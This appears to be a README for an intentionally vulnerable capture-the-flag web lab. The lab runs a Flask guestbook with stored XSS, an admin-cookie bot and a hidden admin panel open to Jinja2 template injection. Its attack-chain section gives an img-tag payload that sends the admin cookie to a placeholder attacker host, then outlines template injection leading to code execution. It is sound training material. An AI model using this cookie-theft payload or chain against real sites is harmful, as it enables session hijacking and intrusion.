# Complex Lab — web01

Multi-step web challenge with stored XSS, cookie theft, and server-side template injection.

## Services

| Service | Port | Details |
|---------|------|---------|
| HTTP | 80 (mapped 8080) | Flask web app — guestbook with stored XSS, hidden admin panel with SSTI |

## Setup

```sh
docker compose up --build -d
```

## Teardown

```sh
docker compose down
```

## Resource Requirements

- Docker Engine 20.10+
- ~120 MB disk (Python slim + Flask + requests)
- Port 8080 available on host

## Attack Surface

- **Guestbook**: Stored XSS — message field rendered without escaping
- **Bot**: Visits guestbook every 15s with admin cookie, follows `<img>` src URLs (leaks cookie via sub-resource requests)
- **Admin panel**: Hidden at `/admin-portal` (discoverable via dir enum / robots.txt), requires stolen `session_token` cookie, Jinja2 SSTI in template preview
- **Red herrings**: `X-Powered-By: Apache/2.4.49` header (suggests CVE-2021-41773), `/api/debug` (generic info), `/backup/` and `/internal-docs/` (403), misleading `robots.txt`

## Attack Chain

1. Directory enumeration or robots.txt → discover `/admin-portal`
2. Attempt admin panel → 403 (needs valid session_token cookie)
3. Find stored XSS in guestbook message field
4. Inject `<img src="http://ATTACKER:PORT/steal">` in guestbook
5. Bot visits guestbook, follows img src with admin cookie → cookie exfiltrated
6. Set stolen cookie → access admin panel template preview
7. Jinja2 SSTI → RCE → read `/root/flag.txt`
